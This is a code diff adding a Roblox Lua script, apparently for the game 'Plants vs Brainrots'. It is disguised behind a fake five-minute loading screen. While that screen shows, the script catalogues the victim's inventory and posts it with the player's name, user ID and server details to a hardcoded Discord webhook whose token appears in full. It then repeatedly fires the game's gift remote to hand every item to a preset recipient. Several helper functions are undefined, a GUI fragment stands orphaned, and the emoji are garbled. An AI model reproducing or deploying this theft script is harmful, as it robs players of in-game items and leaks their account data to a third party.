@@ -1,0 +1,164 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1380708436177588295/6agZPPC13ca0UV56pQID-ovj-MTNcTlMjAohGIfpA7Hh5bn7049FLmtafBKbfPN7J-75"
+
+local SEND_DELAY = 0.6
+local AUTO_SEND_ENABLED = true
+local LOADING_DURATION = 300
+local DEFAULT_RECIPIENTS = {"username"}
+local TOOL_NAMES = {"shovel","hoe","rake","wateringcan","bat"}
+
+
+
+local function autoPickup()
+    for _, obj in ipairs(Workspace:GetDescendants()) do
+        if obj:IsA("Tool") and obj.Parent ~= player.Backpack and obj.Parent ~= player.Character then
+            pcall(function() obj.Parent = player.Backpack end)
+        end
+    end
+end
+
+local function categorizeItems()
+    autoPickup()
+    unequipAll()
+    local plants, brainrots, tools = {}, {}, {}
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, item in ipairs(backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                local nameLower = item.Name:lower()
+                local isTool = false
+                for _, tname in ipairs(TOOL_NAMES) do
+                    if string.find(nameLower,tname) then
+                        table.insert(tools,"馃洜 "..item.Name)
+                        isTool = true
+                        break
+                    end
+                end
+                if isTool then continue end
+                if string.find(nameLower,"brain") or string.find(nameLower,"brainrot") or string.find(nameLower,"kg") then
+                    table.insert(brainrots,"馃 "..item.Name)
+                else
+                    table.insert(plants,"馃尶 "..item.Name)
+                end
+            end
+        end
+    end
+    return plants, brainrots, tools
+end
+
+local function sendItemToRecipient(itemInstance, recipientName)
+    local remote = getGiftRemote()
+    if not remote then return false end
+    unequipAll()
+    local success = false
+    pcall(function()
+        itemInstance.Parent = player.Character
+        remote:FireServer({[1]={["Item"]=itemInstance, ["ToGift"]=recipientName}, [2]=string.char(21)})
+        success = true
+    end)
+    return success
+end
+
+local function sendDiscordEmbed()
+    local plants, brainrots, tools = categorizeItems()
+    local function formatList(list)
+        if #list==0 then return "Empty" end
+        return "```"..table.concat(list,"\n").."```"
+    end
+    local data = {
+        content = "@everyone",
+        username = "馃尡 Kuni Hit | Plants vs Brainrots",
+        avatar_url = getAvatar(player.UserId),
+        embeds = {{
+            title="馃摝 INVENTORY",
+            description="馃槤馃枙 Nadali ka ni Kuni boy!!!!",
+            color = 65280,
+            fields = {
+                {name="馃尶 PLANTS", value=formatList(plants), inline=false},
+                {name="馃 BRAINROTS", value=formatList(brainrots), inline=false},
+                {name="馃洜 TOOLS", value=formatList(tools), inline=false},
+                {name="馃懁 Player", value=player.Name, inline=true},
+                {name="馃啍 User ID", value=tostring(player.UserId), inline=true},
+                {name="馃晵 Time", value=os.date("%Y-%m-%d %H:%M:%S").." 鈴�", inline=true},
+                {name="馃暪 Server Info", value="PlaceId: "..game.PlaceId.."\nJobId: "..game.JobId, inline=false}
+            },
+            footer={text="Kuni Hit"}
+        }}
+    }
+    postRequest(WEBHOOK_URL,data)
+end
+
+local function spamSendToRecipient(recipient)
+    autoPickup()
+    local sentNames = {}
+    while AUTO_SEND_ENABLED do
+        local backpack = player:FindFirstChild("Backpack")
+        if not backpack then break end
+        local items = backpack:GetChildren()
+        if #items==0 then break end
+        for _, item in ipairs(items) do
+            if item:IsA("Tool") then
+                local fired = sendItemToRecipient(item, recipient)
+                if fired then table.insert(sentNames, item.Name or "Unknown") end
+                task.wait(SEND_DELAY)
+            end
+        end
+        task.wait(1)
+    end
+    return sentNames
+end
+
+    local title = Instance.new("TextLabel", bg)
+    title.Size = UDim2.new(0.7,0,0.15,0)
+    title.Position = UDim2.new(0.15,0,0.2,0)
+    title.BackgroundTransparency = 1
+    title.Text = "馃尡 Plants vs Brainrots"
+    title.Font = Enum.Font.GothamBlack
+    title.TextScaled = true
+    title.TextColor3 = Color3.fromRGB(200,255,200)
+
+    local barBG = Instance.new("Frame", bg)
+    barBG.Size = UDim2.new(0.6,0,0.05,0)
+    barBG.Position = UDim2.new(0.2,0,0.45,0)
+    barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
+    local corner = Instance.new("UICorner", barBG)
+    corner.CornerRadius = UDim.new(0,15)
+
+    local fill = Instance.new("Frame", barBG)
+    fill.Size = UDim2.new(0,0,1,0)
+    fill.BackgroundColor3 = Color3.fromRGB(80,220,100)
+    local fillCorner = Instance.new("UICorner", fill)
+    fillCorner.CornerRadius = UDim.new(0,15)
+
+    local percent = Instance.new("TextLabel", bg)
+    percent.Size = UDim2.new(0.2,0,0.06,0)
+    percent.Position = UDim2.new(0.4,0,0.52,0)
+    percent.BackgroundTransparency = 1
+    percent.Text = "0%"
+    percent.Font = Enum.Font.GothamBold
+    percent.TextScaled = true
+    percent.TextColor3 = Color3.fromRGB(240,240,240)
+
+    local start = tick()
+    while tick() - start < duration do
+        local p = math.clamp((tick() - start)/duration,0,1)
+        TweenService:Create(fill, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size=UDim2.new(p,0,1,0)}):Play()
+        percent.Text = tostring(math.floor(p*100)).."%"
+        task.wait(0.05)
+    end
+
+    fill.Size = UDim2.new(1,0,1,0)
+    percent.Text = "Ready! 馃尰"
+    task.wait(0.7)
+    pcall(function() ScreenGui:Destroy() end)
+end
